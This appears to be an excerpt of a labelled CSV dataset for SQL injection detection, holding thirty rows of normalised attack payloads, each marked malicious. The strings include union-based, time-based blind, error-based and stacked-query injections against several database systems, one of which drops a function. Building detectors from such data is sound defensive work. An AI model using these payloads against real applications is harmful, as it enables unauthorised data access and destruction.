row_index,payload_norm,label,sqli_type_hint
3570,"-5300' union all select 2750,2750,2750,2750,2750,2750--",1,
3571,"1%' ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( '%' = '",1,
3572,"-5218 ) union all select 9677,9677#",1,
3573,1%' rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and '%' = ',1,
3574,1%' ) ) ) and 7219 = 7361 and ( ( ( '%' = ',1,
3575,"-2916"" ) ) or 4946 = 8232--",1,
3576,"1'+ ( select 'sppw' where 1677 = 1677 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) ) +'",1,
3577,-6712' ) ) as kqff where 9146 = 9146 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1,
3578,"-7812' ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'ttvo' = 'ttvo",1,
3579,"1' in boolean mode ) union all select null,null,null--",1,
3580,-7279 ) or 9898 = 9963 and ( 1481 = 1481,1,
3581,-8523 ) as hzqs where 8944 = 8944 order by 1--,1,
3582,"1 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) -- wynp",1,
3583,"1"" ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ""mmgx"" like ""mmgx",1,
3584,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ""zzmn"" = ""zzmn",1,
3585,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ""%"" = """,1,
3586,"1"" ) where 9570 = 9570 rlike ( select ( case when ( 1642 = 3686 ) then 1 else 0x28 end ) ) --",1,
3587,"-6789'|| ( select 'uckz' from dual where 2163 = 2163 union all select 2163,2163,2163,2163,2163,2163--",1,
3588,"1"" ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""urgd"" = ""urgd",1,
3589,1' ) as mwpp where 6192 = 6192,1,
3590,1' in boolean mode ) rlike sleep ( 5 ) #,1,
3591,"1' ) where 7658 = 7658 union all select null,null#",1,
3592,"-8988"" ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""dyxh"" like ""dyxh",1,
3593,"-7065'+ ( select 'bdxr' where 1756 = 1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",1,
3594,"1' and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'cdgm' like 'cdgm",1,
3595,"-8588' union all select 2135,2135--",1,
3596,if ( 1928 = 4811 ) select 1928 else drop function ucko--,1,
3597,1' ) as pudv where 2609 = 2609,1,
3598,"-8698"" where 1990 = 1990 or ( 8459 = 8459 ) *4906--",1,
3599,"1%' and elt ( 7619 = 1489,1489 ) and '%' = '",1,
